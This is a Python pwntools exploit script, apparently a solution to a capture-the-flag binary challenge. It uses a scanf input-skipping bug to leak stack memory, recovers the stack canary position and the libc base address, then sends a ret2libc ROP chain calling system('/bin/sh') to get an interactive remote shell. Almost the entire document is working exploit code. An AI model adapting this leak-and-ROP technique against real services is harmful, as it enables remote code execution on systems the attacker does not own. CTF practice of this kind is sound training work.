#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './chall_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc host port'.split()

if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    libc = ELF('./libc.so.6')
    ld = ELF('./ld-linux-x86-64.so.2')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


def extract_leak(recv):
    '''Extract the leaked address from the received data.'''
    try:
        leak = list(map(lambda x: int(x,16), recv.split(b'|')[1:]))
        return leak
    except (IndexError, ValueError):
        log.error("Failed to extract leak from: {}".format(recv))
        return None
    

def addrx(func, x):
    '''Show func in hex'''
    log.info(f'{func}: {x}')


gdbscript = '''
b *(main+537)
continue
'''.format(**locals())
amt = 0x120 - 8
p = start()

# offsets of addressses in leak
off_canary = 264 
off_libc = 280

# leak 1024 bytes via scanf skip
p.sendline(b'2')
p.sendline(b'1024')
p.sendline(b'+ ' * 1024)

# parse output   
out = p.recvuntil(b'\n1. oct2dec', drop=1).split()[12:]
log.info(out)
parsed_int = list(map(int, out))
parsed_hex = ' '.join(list(map(lambda x: hex(int(x.decode()))[2:].rjust(2,'0'), out)))

# leak  libc
libc.address = int.from_bytes(bytes(parsed_int[off_libc:off_libc+8]), 'little') - \
      (libc.sym.__libc_start_call_main + 122)
log.info(f'libc: {libc.address:#x}')
print(parsed_hex)

# rop
rop = ROP(libc)
ropchain = [
    p64(rop.find_gadget(['ret'])[0]),
    p64(rop.find_gadget(['pop rdi', 'ret'])[0]),
    p64(next(libc.search(b'/bin/sh\0'))),
    p64(libc.sym.system)

]

ropping = b''.join(map(lambda x: x.hex().encode(), ropchain))

p.sendline(b'2')
p.sendline(str(amt + 32).encode())
p.sendline(b'+ ' * amt + ropping) # skip canary to prevent stack smashing
p.sendline(b'3')

p.interactive()